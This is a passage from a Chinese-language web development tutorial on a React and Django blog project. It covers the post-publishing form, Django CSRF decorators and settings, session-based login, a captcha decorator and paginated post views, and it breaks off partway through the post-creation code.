<pre class="src src-js"><span style="color: #b22222;">/*</span><span style="color: #b22222;">src/component/pub.js&#25991;&#20214;&#20869;&#23481;</span><span style="color: #b22222;"> */</span>
<span style="color: #a020f0;">import</span> React from <span style="color: #8b2252;">'react'</span>;
<span style="color: #a020f0;">import</span> { Link, Redirect } from <span style="color: #8b2252;">'react-router-dom'</span>;
<span style="color: #a020f0;">import</span> { postService as service } from <span style="color: #8b2252;">'../service/post'</span>;
<span style="color: #a020f0;">import</span> { observer } from <span style="color: #8b2252;">'mobx-react'</span>;
<span style="color: #a020f0;">import</span> { inject } from <span style="color: #8b2252;">'../utils'</span>;
<span style="color: #a020f0;">import</span> { Form, Input, Button, Modal } from <span style="color: #8b2252;">'antd'</span>;
<span style="color: #a020f0;">import</span> BraftEditor from <span style="color: #8b2252;">'braft-editor'</span>
<span style="color: #a020f0;">import</span> <span style="color: #8b2252;">'braft-editor/dist/index.css'</span>

@inject({ service })
@observer <span style="color: #b22222;">// </span><span style="color: #b22222;">observer &#24517;&#39035;&#32039;&#32039;&#38752;&#30528;&#32452;&#20214;</span>
<span style="color: #a020f0;">class</span> _Pub <span style="color: #a020f0;">extends</span> React.Component {

    componentDidMount() {
        <span style="color: #b22222;">// </span><span style="color: #b22222;">&#24322;&#27493;&#35774;&#32622;&#32534;&#36753;&#22120;&#20869;&#23481;</span>
        setTimeout(() =&gt; {
            <span style="color: #008b8b;">this</span>.props.form.setFieldsValue({
                content: BraftEditor.createEditorState(<span style="color: #8b2252;">'&lt;p&gt;&#20869;&#23481;&lt;/p&gt;'</span>) <span style="color: #b22222;">// </span><span style="color: #b22222;">&#35774;&#32622;&#32534;&#36753;&#22120;&#21021;&#22987;&#20869;&#23481;</span>
            })
        }, 1000)
    }
    handleSubmit(e) {
        e.preventDefault(); <span style="color: #b22222;">// </span><span style="color: #b22222;">&#38459;&#27490;&#25552;&#20132;</span>
        <span style="color: #008b8b;">this</span>.props.form.validateFields((err, values) =&gt; {
            <span style="color: #a020f0;">if</span> (!err) {
                console.log(<span style="color: #8b2252;">'&#27809;&#26377;&#38169;&#65292;&#20877;&#30475;'</span>, values.title, values.content.toHTML());
                <span style="color: #008b8b;">this</span>.props.service.pub(values.title, values.content.toHTML());
            }
        });
        <span style="color: #b22222;">// </span><span style="color: #b22222;">console.log(e.target);</span>
        <span style="color: #b22222;">// </span><span style="color: #b22222;">let form = e.target;</span>
        <span style="color: #b22222;">// </span><span style="color: #b22222;">const [title, content] = form;</span>
        <span style="color: #b22222;">// </span><span style="color: #b22222;">console.log(title.value, content.value);</span>
        <span style="color: #b22222;">// </span><span style="color: #b22222;">this.props.service.pub(title.value, content.value)</span>
    }

    handleOk = e =&gt; {
        console.log(e);
        <span style="color: #008b8b;">this</span>.props.service.success = <span style="color: #008b8b;">false</span>;
    };

    handleCancel = e =&gt; {
        console.log(e);
        <span style="color: #008b8b;">this</span>.props.service.success = <span style="color: #008b8b;">false</span>;
    };

    render() {
        console.log(<span style="color: #8b2252;">'pub render ~~~~~'</span>)
        <span style="color: #a020f0;">const</span> <span style="color: #a0522d;">layout</span> = {
            labelCol: { span: 5 },
            wrapperCol: { span: 14 },
        };
        <span style="color: #a020f0;">const</span> <span style="color: #a0522d;">tailLayout</span> = {
            wrapperCol: { offset: 8, span: 16 },
        };
        <span style="color: #a020f0;">const</span> { getFieldDecorator } = <span style="color: #008b8b;">this</span>.props.form; <span style="color: #b22222;">// </span><span style="color: #b22222;">&#36825;&#21477;&#24456;&#37325;&#35201;</span>
        <span style="color: #b22222;">// </span><span style="color: #b22222;">&#36873;&#25321;&#32534;&#36753;&#22120;&#24037;&#20855;&#26639;&#19978;&#30340;&#25353;&#38062;</span>
        <span style="color: #a020f0;">const</span> <span style="color: #a0522d;">controls</span> = [<span style="color: #8b2252;">'bold'</span>, <span style="color: #8b2252;">'italic'</span>, <span style="color: #8b2252;">'underline'</span>, <span style="color: #8b2252;">'text-color'</span>, <span style="color: #8b2252;">'separator'</span>, <span style="color: #8b2252;">'link'</span>, <span style="color: #8b2252;">'separator'</span>, <span style="color: #8b2252;">'media'</span>]
        <span style="color: #a020f0;">return</span> (
            &lt;div&gt;
                &lt;Modal
                    title=<span style="color: #8b2252;">"&#25104;&#21151;&#25552;&#20132;"</span>
                    visible={<span style="color: #008b8b;">this</span>.props.service.success}
                    onOk={<span style="color: #008b8b;">this</span>.handleOk.bind(<span style="color: #008b8b;">this</span>)}
                    onCancel={<span style="color: #008b8b;">this</span>.handleCancel.bind(<span style="color: #008b8b;">this</span>)}&gt;
                    &lt;p&gt;&#26159;&#21542;&#36339;&#36716;&#21040;&#35813;&#20869;&#23481;&#30340;&#39029;&#38754;&#65311;&lt;/p&gt;
                &lt;/Modal&gt;
                &lt;Form {...layout} onSubmit={<span style="color: #008b8b;">this</span>.handleSubmit.bind(<span style="color: #008b8b;">this</span>)}&gt;
                    &lt;Form.Item label=<span style="color: #8b2252;">"&#26631;&#39064;"</span>&gt;
                        {
                            getFieldDecorator(<span style="color: #8b2252;">'title'</span>, {
                                rules: [
                                    { required: <span style="color: #008b8b;">true</span>, message: <span style="color: #8b2252;">'&#35831;&#36755;&#20837;&#26631;&#39064;'</span> },
                                    { min: 2, message: <span style="color: #8b2252;">'&#26631;&#39064;&#33267;&#23569;&#24212;&#35813;&#26377;2&#20010;&#23383;'</span> }
                                ],
                            })(&lt;Input placeholder=<span style="color: #8b2252;">'&#35831;&#36755;&#20837;&#26631;&#39064;'</span> /&gt;)
                        }
                    &lt;/Form.Item&gt;
                    &lt;Form.Item label=<span style="color: #8b2252;">"&#25991;&#31456;&#27491;&#25991;"</span>&gt;
                        {
                            getFieldDecorator(<span style="color: #8b2252;">'content'</span>, {
                                validateTrigger: <span style="color: #8b2252;">'onBlur'</span>,
                                rules: [{
                                    required: <span style="color: #008b8b;">true</span>,
                                    validator: (_, value, callback) =&gt; {
                                        <span style="color: #a020f0;">if</span> (value.isEmpty()) {
                                            callback(<span style="color: #8b2252;">'&#35831;&#36755;&#20837;&#27491;&#25991;&#20869;&#23481;'</span>)
                                        } <span style="color: #a020f0;">else</span> {
                                            callback()
                                        }
                                    }
                                }],
                            })(&lt;BraftEditor
                                className=<span style="color: #8b2252;">'my-editor'</span>
                                controls={controls}
                                placeholder=<span style="color: #8b2252;">'&#35831;&#36755;&#20837;&#27491;&#25991;&#20869;&#23481;'</span>
                            /&gt;
                            )
                        }
                    &lt;/Form.Item&gt;
                    &lt;Form.Item wrapperCol={{ span: 12, offset: 5 }}&gt;
                        &lt;Button type=<span style="color: #8b2252;">"primary"</span> htmlType=<span style="color: #8b2252;">"submit"</span>&gt;
                            &#21457;&#24067;
                        &lt;/Button&gt;
                    &lt;/Form.Item&gt;
                &lt;/Form&gt;
            &lt;/div&gt;
        );
    }
}

<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">Pub</span> = Form.create()(_Pub); <span style="color: #b22222;">// </span><span style="color: #b22222;">_Pub&#32452;&#20214;&#23601;&#26377;&#20102;this.props.form</span>
<span style="color: #a020f0;">export</span> <span style="color: #a020f0;">default</span> Pub;
</pre>
</div>
</div>
</div>
<div id="outline-container-h:4c091348-5b69-413f-b8c1-89dc3e47094c" class="outline-4">
<h4 id="h:4c091348-5b69-413f-b8c1-89dc3e47094c">发布功能实现</h4>
<div class="outline-text-4" id="text-h:4c091348-5b69-413f-b8c1-89dc3e47094c">
<p>
目前服务器端采用的是禁用了csrf中间件，相当于全体不检查csrf，就开启黑名单机制，对某些函数要求必须通过Csrf验证。
</p>

<p>
由于是前后端分离项目，没有使用模板，所以服务器端必须提供一个接口，使得客户端可以获得csrftoken.
</p>

<p>
参考<a href="https://docs.djangoproject.com/zh-hans/2.2/ref/csrf/#ajaX">https://docs.djangoproject.com/zh-hans/2.2/ref/csrf/#ajaX</a>
</p>

<p>
CSRF_USE_SESSIONS缺省是False，就是不在服务端session中存储:
</p>

<p>
CSRF_COOKIE_HTTPONLY缺省也是False，即可以通过客户端JS脚本访问到此csrf的cookie
</p>
</div>
<div id="outline-container-h:b18271ca-10aa-4c1b-b4b1-62ac5db9ace6" class="outline-5">
<h5 id="h:b18271ca-10aa-4c1b-b4b1-62ac5db9ace6">装饰器</h5>
<div class="outline-text-5" id="text-h:b18271ca-10aa-4c1b-b4b1-62ac5db9ace6">
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">from</span> django.views.decorators.csrf <span style="color: #a020f0;">import</span> csrf_protect
<span style="color: #a020f0;">from</span> django.views.decorators.csrf <span style="color: #a020f0;">import</span> csrf_exermpt
<span style="color: #a020f0;">from</span> django.views.decorators.csrf <span style="color: #a020f0;">import</span> ensure_csrf_cookie
</pre>
</div>

<ul class="org-ul">
<li>@csrf_protect本质上把TsrfViewMiddleware当装饰器函数用，此中间件不对GET、HEAD、OPTIONS、TRACE方法检查csrf，其它方法例如POST就要检查</li>
<li>@csrf_exempt本质上把CsrfViewMiddleware当装饰器函数用，不过就是在检查时，如果发现csrf_exempt属性为True，CsrfViewMiddleware的process_viewi函数直接return None，去下一个</li>
<li>@ensure_csrf_cookie本质上把CsrfViewMiddleware当装饰器函数用。使用这个装饰器，确保在CsrfViewMiddleware的process_response中确保response被设置CSPRF的cookie</li>
</ul>

<p>
我们这一次注释掉了CsrfViewMiddleware中间件，使用上面的装饰器注释视图函数，相当于调用视图函数前，想把CsrfViewMiddleware当做函数来检查。这种使用方式只对被装饰的视图函数有效，中间件是检查所有请求和响应。
</p>

<p>
settings.py
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a0522d;">CSRF_TRUSTED_ORIGINS</span> = [<span style="color: #8b2252;">'http://127.0.0.1:3000'</span>, <span style="color: #8b2252;">'http://localhost:3000'</span>]
</pre>
</div>

<p>
user/views.py
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">from</span> django.shortcuts <span style="color: #a020f0;">import</span> render
<span style="color: #a020f0;">from</span> django.http <span style="color: #a020f0;">import</span> HttpRequest, HttpResponse, JsonResponse
<span style="color: #a020f0;">from</span> django.contrib.auth.models <span style="color: #a020f0;">import</span> User
<span style="color: #a020f0;">from</span> django.contrib.auth <span style="color: #a020f0;">import</span> authenticate, login, logout
<span style="color: #a020f0;">from</span> django.views.decorators.http <span style="color: #a020f0;">import</span> require_GET, require_POST, require_http_methods
<span style="color: #b22222;"># </span><span style="color: #b22222;">from django.contrib.auth.decorators import login_required  #&#20889;&#30340;&#38750;&#24120;&#22909;</span>
<span style="color: #a020f0;">from</span> functools <span style="color: #a020f0;">import</span> wraps
<span style="color: #a020f0;">from</span> django.contrib.sessions.backends.db <span style="color: #a020f0;">import</span> SessionStore
<span style="color: #a020f0;">import</span> simplejson
<span style="color: #a020f0;">from</span> messages <span style="color: #a020f0;">import</span> Messages

<span style="color: #228b22;">@require_POST</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">reg</span>(request:HttpRequest):
    <span style="color: #a020f0;">try</span>:
        <span style="color: #a0522d;">payload</span> = simplejson.loads(request.body)
        <span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">type</span>(payload), payload)
        <span style="color: #a0522d;">username</span> = payload.get(<span style="color: #8b2252;">'username'</span>)
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21028;&#26029;&#29992;&#25143;&#21517;&#26159;&#21542;&#23384;&#22312;&#65311;&#27983;&#35272;&#22120;&#31471;&#26377;&#27809;&#26377;&#25552;&#37266;&#36807;&#29992;&#25143;&#65292;&#27704;&#36828;&#19981;&#35201;&#30456;&#20449;&#23458;&#25143;&#31471;</span>
        <span style="color: #a0522d;">count</span> = User.objects.<span style="color: #483d8b;">filter</span>(username=username).count()
        <span style="color: #a020f0;">if</span> count&gt;0:
            <span style="color: #a020f0;">return</span> JsonResponse(Messages.USER_EXISTS)
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#25968;&#25454;&#23384;&#20648;</span>
        <span style="color: #a0522d;">email</span> = payload[<span style="color: #8b2252;">'email'</span>]
        <span style="color: #a0522d;">password</span> = payload[<span style="color: #8b2252;">'password'</span>]
        <span style="color: #a0522d;">user</span> = User.objects.create_user(username, email, password)
        <span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">type</span>(user), user) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#19968;&#26086;&#21019;&#24314;&#25104;&#21151;&#65292;&#30331;&#24405;&#25104;&#21151;&#30475;&#21040;&#30340;&#26159;User&#23454;&#20363;</span>

        <span style="color: #a020f0;">return</span> JsonResponse({}, status=201)
        <span style="color: #b22222;">#</span><span style="color: #b22222;">return HttpResponse(content_type='application/json', status=201)</span>
    <span style="color: #a020f0;">except</span> <span style="color: #228b22;">Exception</span> <span style="color: #a020f0;">as</span> e:
        <span style="color: #a020f0;">return</span> JsonResponse(Messages.BAD_REQUEST, status=200)

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#39564;&#35777;&#30721;&#35013;&#39280;&#22120;</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">test_captcha</span>(viewfunc):
    <span style="color: #228b22;">@wraps</span>(viewfunc)
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">wrapper</span>(request:HttpRequest, *args, **kwargs):
        <span style="color: #a020f0;">try</span>:
            <span style="color: #a0522d;">payload</span> = simplejson.loads(request.body)
            <span style="color: #a0522d;">challenge</span> = payload[<span style="color: #8b2252;">'challenge'</span>]
            <span style="color: #a0522d;">key</span> = payload[<span style="color: #8b2252;">'key'</span>]
            <span style="color: #a020f0;">if</span> challenge.lower() == CaptchaStore.objects.get(hashkey=key).response:
                <span style="color: #a020f0;">return</span> viewfunc(request, *args, **kwargs)
        <span style="color: #a020f0;">except</span> <span style="color: #228b22;">Exception</span> <span style="color: #a020f0;">as</span> e:
            <span style="color: #483d8b;">print</span>(e)
        <span style="color: #a020f0;">return</span> JsonResponse(Messages.WRONG_CAPTCHA)
    <span style="color: #a020f0;">return</span> wrapper

<span style="color: #228b22;">@require_POST</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">@test_captcha</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">user_login</span>(request:HttpRequest):
    <span style="color: #a020f0;">try</span>:
        <span style="color: #a0522d;">payload</span> = simplejson.loads(request.body)
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#39564;&#35777;&#30721;&#21028;&#26029; &#20351;&#29992;&#35013;&#39280;&#22120;</span>
        <span style="color: #a0522d;">username</span> = payload[<span style="color: #8b2252;">'username'</span>] <span style="color: #b22222;"># </span><span style="color: #b22222;">&#30331;&#24405;  &#35813;&#22914;&#20309;&#22788;&#29702;&#65311;</span>
        <span style="color: #a0522d;">password</span> = payload[<span style="color: #8b2252;">'password'</span>]
        <span style="color: #a0522d;">user</span> = authenticate(username=username, password=password)
        <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'='</span>*30)
        <span style="color: #a020f0;">if</span> user <span style="color: #a020f0;">and</span> user.is_active: <span style="color: #b22222;">#</span><span style="color: #b22222;">&#29992;&#25143;&#23494;&#30721;&#27491;&#30830;</span>
            login(request, user) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21508;&#31181;&#21518;&#21488;jsp, php&#37117;&#20064;&#24815;&#36890;&#36807;request.session&#21462;session&#20540;&#65307;user&#32465;&#23450;&#21040;request&#19978;</span>
            <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'=*'</span>*30)
            <span style="color: #b22222;"># </span><span style="color: #b22222;">&#22914;&#26524;&#26377;&#24517;&#35201;&#65292;&#21487;&#20197;&#20351;&#29992;session&#20445;&#23384;&#19968;&#20123;&#20449;&#24687;</span>
            <span style="color: #a0522d;">session</span>:<span style="color: #228b22;">SessionStore</span> = request.session
            <span style="color: #b22222;"># </span><span style="color: #b22222;">session.set_expiry(60*60*24) # &#35774;&#32622;&#36807;&#26399;&#26102;&#38388;&#65292;&#21333;&#20301;&#31186;</span>
            <span style="color: #a0522d;">session</span>[<span style="color: #8b2252;">'user_info'</span>] = {
                <span style="color: #8b2252;">'id'</span>: request.user.<span style="color: #483d8b;">id</span>,
                <span style="color: #8b2252;">'username'</span>:request.user.username
            }
            <span style="color: #a020f0;">return</span> JsonResponse({}) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#20351;&#29992;&#20102;login&#20989;&#25968;&#65292;&#36820;&#22238;&#26102;&#23601;&#24102;&#30528;set-cookie&#65292;&#35774;&#32622;sessionid</span>
        <span style="color: #a020f0;">else</span>:
            <span style="color: #a020f0;">return</span> JsonResponse(Messages.INVALID_USERNAME_OR_PASSWORD, status=200)
    <span style="color: #a020f0;">except</span> <span style="color: #228b22;">Exception</span> <span style="color: #a020f0;">as</span> e:
        <span style="color: #483d8b;">print</span>(e)
        <span style="color: #a020f0;">return</span> JsonResponse(Messages.BAD_REQUEST, status=200)

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">login_required</span>(exclude_methods=<span style="color: #008b8b;">None</span>):
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">_login_required</span>(viewfunc):
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21442;&#29031;django.contrib.auth.decorators.login_required</span>
        <span style="color: #228b22;">@wraps</span>(viewfunc)
        <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">wrapper</span>(request, *args, **kwars):
            <span style="color: #a020f0;">nonlocal</span> exclude_methods
            <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'='</span> * 30)
            <span style="color: #a0522d;">method</span> = request.method.lower()
            <span style="color: #a020f0;">if</span> exclude_methods <span style="color: #a020f0;">is</span> <span style="color: #008b8b;">None</span>:
                <span style="color: #a0522d;">exclude_methods</span> = []
            <span style="color: #a0522d;">exclude_methods</span> = [x.lower() <span style="color: #a020f0;">for</span> x <span style="color: #a020f0;">in</span> exclude_methods]
            <span style="color: #a020f0;">if</span> method <span style="color: #a020f0;">in</span> exclude_methods: <span style="color: #b22222;"># </span><span style="color: #b22222;">&#19981;&#35748;&#35777;</span>
                <span style="color: #a020f0;">return</span> viewfunc(request, *args, **kwars)
            <span style="color: #a020f0;">else</span>:
                <span style="color: #a020f0;">if</span> request.user.is_authenticated:
                    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'&#35748;&#35777;&#20102;'</span>)
                    <span style="color: #a020f0;">return</span> viewfunc(request, *args, **kwars)
                <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'&#26410;&#35748;&#35777;&#36890;&#36807;'</span>)
                <span style="color: #a020f0;">return</span> HttpResponse(status=401)
        <span style="color: #a020f0;">return</span> wrapper
    <span style="color: #a020f0;">if</span> <span style="color: #483d8b;">callable</span>(exclude_methods): <span style="color: #b22222;"># </span><span style="color: #b22222;">&#20860;&#23481;&#20043;&#21069;&#35843;&#29992;&#65292;&#22914;&#26524;&#26159;&#26080;&#21442;&#35843;&#29992;&#23601;&#26159;&#20989;&#25968;&#65292;&#24110;&#23427;&#24448;&#37324;&#38754;&#35843;&#29992;&#19968;&#23618;&#36820;&#22238;</span>
        <span style="color: #a0522d;">fn</span> = exclude_methods
        <span style="color: #a0522d;">exclude_methods</span> = () <span style="color: #b22222;"># </span><span style="color: #b22222;">&#34920;&#31034;&#27809;&#20160;&#20040;&#26041;&#27861;method&#35201;&#25490;&#38500;&#65292;&#37117;&#35201;&#35748;&#35777;</span>
        <span style="color: #a020f0;">return</span> _login_required(fn)
    <span style="color: #a020f0;">return</span> _login_required

<span style="color: #228b22;">@login_required</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">@login_required  # &#31561;&#20215;&#20110; user_logout = login_required(user_logout)</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">@login_required(login_url='users/login') # &#31561;&#20215;&#20110; user_logout = login_required(login_url='users/login')(user_logout)</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">user_logout</span>(request:HttpRequest):
    logout(request) <span style="color: #b22222;"># </span><span style="color: #b22222;">request.session, request.user &#28165;&#31354;&#24403;&#21069;&#29992;&#25143;&#30331;&#24405;&#29366;&#24577;&#65292;&#21253;&#25324;session&#21644;&#25968;&#25454;&#24211;django_session&#35760;&#24405;</span>
    <span style="color: #a020f0;">return</span> HttpResponse(<span style="color: #8b2252;">'&#30331;&#20986;&#25104;&#21151;'</span>, status=200)

<span style="color: #a020f0;">from</span> captcha.models <span style="color: #a020f0;">import</span> CaptchaStore
<span style="color: #a020f0;">from</span> captcha.helpers <span style="color: #a020f0;">import</span> captcha_image_url

<span style="color: #228b22;">@require_GET</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">get_captcha</span>(request:HttpRequest):
    <span style="color: #a020f0;">try</span>:
        <span style="color: #a0522d;">key</span> = CaptchaStore.generate_key()
        <span style="color: #a0522d;">image_url</span> = captcha_image_url(key)
        <span style="color: #a020f0;">return</span> JsonResponse({<span style="color: #8b2252;">'key'</span>:key, <span style="color: #8b2252;">'image_url'</span>:image_url})
    <span style="color: #a020f0;">except</span> <span style="color: #228b22;">Exception</span> <span style="color: #a020f0;">as</span> e:
        <span style="color: #483d8b;">print</span>(e)
        <span style="color: #a020f0;">return</span> JsonResponse(Messages.NOT_FOUND)
</pre>
</div>

<p>
post/urls.py
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">from</span> django.urls <span style="color: #a020f0;">import</span> path
<span style="color: #a020f0;">from</span> .views <span style="color: #a020f0;">import</span> PostView, getpost
<span style="color: #a020f0;">from</span> user.views <span style="color: #a020f0;">import</span> login_required

<span style="color: #a0522d;">urlpatterns</span> = [
    path(<span style="color: #8b2252;">''</span>, PostView.as_view()), <span style="color: #b22222;"># </span><span style="color: #b22222;">&#25490;&#38500;get&#26041;&#27861;&#65292;get&#26041;&#27861;&#19981;&#35748;&#35777;</span>
    path(<span style="color: #8b2252;">'&lt;int:id&gt;'</span>, getpost), <span style="color: #b22222;"># </span><span style="color: #b22222;">/posts/123</span>
]
</pre>
</div>

<p>
post/views.py 增加@method_decorator([login_required, csrf_protect]) 同时验证用户身份和csrftoken
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">from</span> django.http <span style="color: #a020f0;">import</span> HttpResponse, JsonResponse, HttpRequest
<span style="color: #a020f0;">from</span> django.views <span style="color: #a020f0;">import</span> View
<span style="color: #a020f0;">from</span> django.views.decorators.csrf <span style="color: #a020f0;">import</span> csrf_protect, csrf_exempt, ensure_csrf_cookie
<span style="color: #a020f0;">import</span> simplejson
<span style="color: #a020f0;">from</span> .models <span style="color: #a020f0;">import</span> Post, Content
<span style="color: #a020f0;">import</span> datetime
<span style="color: #a020f0;">from</span> django.db.transaction <span style="color: #a020f0;">import</span> atomic
<span style="color: #a020f0;">from</span> messages <span style="color: #a020f0;">import</span> Messages
<span style="color: #a020f0;">from</span> user.views <span style="color: #a020f0;">import</span> login_required
<span style="color: #a020f0;">from</span> django.utils.decorators <span style="color: #a020f0;">import</span> method_decorator
<span style="color: #a020f0;">import</span> math

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">validate</span>(d:<span style="color: #483d8b;">dict</span>,name:<span style="color: #483d8b;">str</span>,default,type_func,validate_func):
    <span style="color: #a020f0;">try</span>:
        <span style="color: #a0522d;">ret</span> = type_func(d.get(name,default))
        <span style="color: #a0522d;">ret</span> = validate_func(ret,default)
    <span style="color: #a020f0;">except</span>:
        <span style="color: #a0522d;">ret</span> = default
    <span style="color: #a020f0;">return</span> ret

<span style="color: #b22222;"># </span><span style="color: #b22222;"># login_required&#26080;&#21442;&#35013;&#39280;&#22120;&#35013;&#39280;&#35270;&#22270;&#20989;&#25968;&#30340;&#24418;&#24335;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">@method_decorator(login_required, name='dispatch')</span>
<span style="color: #a020f0;">class</span> <span style="color: #228b22;">PostView</span>(View):
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">get</span>(<span style="color: #a020f0;">self</span>, request): <span style="color: #b22222;"># </span><span style="color: #b22222;">&#26041;&#27861;&#21517;&#19968;&#23450;&#35201;&#23567;&#20889; &#25991;&#31456;&#21015;&#34920; /posts/?page=3&amp;size=20</span>
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#39029;&#30721;  </span>
        <span style="color: #a0522d;">page</span> = validate(request.GET,<span style="color: #8b2252;">"page"</span>, 1, <span style="color: #483d8b;">int</span>, <span style="color: #a020f0;">lambda</span> x,y:x <span style="color: #a020f0;">if</span> x&gt;0 <span style="color: #a020f0;">and</span> x &lt;51 <span style="color: #a020f0;">else</span> y)
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#27599;&#39029;&#26465;&#25968;</span>
        <span style="color: #b22222;">#</span><span style="color: #b22222;">&#27880;&#24847;&#65292;&#36825;&#20010;&#25968;&#25454;&#19981;&#35201;&#36731;&#26131;&#35753;&#27983;&#35272;&#22120;&#31471;&#25913;&#21464;&#65292;&#22914;&#26524;&#20801;&#35768;&#25913;&#21464;&#65292;&#19968;&#23450;&#35201;&#25511;&#21046;&#33539;&#22260;</span>
        <span style="color: #a0522d;">size</span> = validate(request.GET,<span style="color: #8b2252;">"size"</span>, 20, <span style="color: #483d8b;">int</span>, <span style="color: #a020f0;">lambda</span> x,y:x <span style="color: #a020f0;">if</span> x&gt;0 <span style="color: #a020f0;">and</span> x&lt;101 <span style="color: #a020f0;">else</span> y)
        <span style="color: #483d8b;">print</span>(page, size)

        <span style="color: #a020f0;">try</span>:
            <span style="color: #b22222;"># </span><span style="color: #b22222;">&#20998;&#39029;</span>
            <span style="color: #a0522d;">start</span> = size*(page-1) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#22914;&#26524;&#31532;1&#22825; size*(1-1)</span>
            <span style="color: #a0522d;">mgr</span> = Post.objects
            <span style="color: #a0522d;">total</span> = mgr.count()
            <span style="color: #a0522d;">posts</span> = mgr.order_by(<span style="color: #8b2252;">'-pk'</span>)[start:start+size]

            <span style="color: #a020f0;">return</span> JsonResponse({
                <span style="color: #8b2252;">'posts'</span>:[{<span style="color: #8b2252;">'id'</span>:post.<span style="color: #483d8b;">id</span>, <span style="color: #8b2252;">'title'</span>:post.title} <span style="color: #a020f0;">for</span> post <span style="color: #a020f0;">in</span> posts],
                <span style="color: #8b2252;">'pagination'</span>:{
                    <span style="color: #8b2252;">'page'</span>:page,
                    <span style="color: #8b2252;">'size'</span>:size,
                    <span style="color: #8b2252;">'total'</span>:total, <span style="color: #b22222;"># </span><span style="color: #b22222;">&#24635;&#20849;&#26377;&#22810;&#23569;&#20010;</span>
                    <span style="color: #8b2252;">'pages'</span>:math.ceil(total / size) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#24635;&#20849;&#26377;&#22810;&#23569;&#39029; &#21521;&#19978;&#21462;&#25972;</span>
                }
            })
        <span style="color: #a020f0;">except</span> <span style="color: #228b22;">Exception</span> <span style="color: #a020f0;">as</span> e:
            <span style="color: #483d8b;">print</span>(e)
            <span style="color: #a020f0;">return</span> JsonResponse(Messages.BAD_REQUEST)
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#24517;&#39035;&#30331;&#24405;</span>
    <span style="color: #b22222;"># </span><span style="color: #b22222;">csrf_protect, csrf_exempt, ensure_csrf_cookie&#65292;&#37117;&#26159;&#30452;&#25509;&#35013;&#39280;&#35270;&#22270;&#20989;&#25968;&#30340;</span>
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#19978;&#38754;3&#20010;&#35013;&#39280;&#22120;&#20989;&#25968;&#65292;&#26412;&#36136;&#19978;&#37117;&#20351;&#29992;&#20102;&#21516;&#19968;&#20010;&#20013;&#38388;&#20214;&#65292;&#25226;&#20013;&#38388;&#20214;&#24403;&#20316;&#26222;&#36890;&#20989;&#25968;&#20351;&#29992;&#65292;</span>
    <span style="color: #b22222;"># </span><span style="color: #b22222;">csrf_protect &#38656;&#35201;&#24517;&#39035;&#36827;&#34892;csrf&#35748;&#35777;</span>
    <span style="color: #b22222;"># </span><span style="color: #b22222;">csrf_exempt &#19981;&#20570;csrf&#35748;&#35777;</span>
    <span style="color: #b22222;"># </span><span style="color: #b22222;">ensure_csrf_cookie &#22312;&#22806;&#23618;&#21253;&#20303;&#20102;&#30830;&#20445;&#35270;&#22270;&#20989;&#25968;&#22312;&#36820;&#22238;&#38454;&#27573;</span>
    <span style="color: #228b22;">@method_decorator</span>([login_required, csrf_protect])
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">post</span>(<span style="color: #a020f0;">self</span>, request): <span style="color: #b22222;"># </span><span style="color: #b22222;">&#22914;&#26524;&#27809;&#26377;post&#20989;&#25968;&#65292;POST&#35831;&#27714;&#26080;&#27861;&#23545;&#24212;&#65292;&#36820;&#22238;405 &#21457;&#24067;</span>
        <span style="color: #a020f0;">try</span>:
            <span style="color: #a0522d;">payload</span> = simplejson.loads(request.body)
            <span style="color: #a0522d;">title</span> = payload[<span style="color: #8b2252;">'title'</span>]
            <span style="color: #a0522d;">C</span> = payload[<span style="color: #8b2252;">'content'</span>]
            <span style="color: #a0522d;">post</span> = Post(title=title)
            <span style="color: #a0522d;">content</span> = Content()

            post.<span style="color: #a0522d;">postdate</span> = datetime.datetime.now(
                datetime.timezone(datetime.timedelta(hours=8))
            )
            <span style="color: #b22222;"># </span><span style="color: #b22222;">post.author_id = 2 #request.user.id</span>
            post.<span style="color: #a0522d;">author</span> = request.user
            content.<span style="color: #a0522d;">content</span> = C

            <span style="color: #a020f0;">with</span> atomic():
                post.save()
                content.<span style="color: #a0522d;">post</span>  = post
                content.save()
            <span style="color: #a020f0;">return</span> JsonResponse({<span style="color: #8b2252;">'post'</span>:{
                <span style="color: #8b2252;">'id'</span>:post.<span style="color: #483d8b;">id</span>
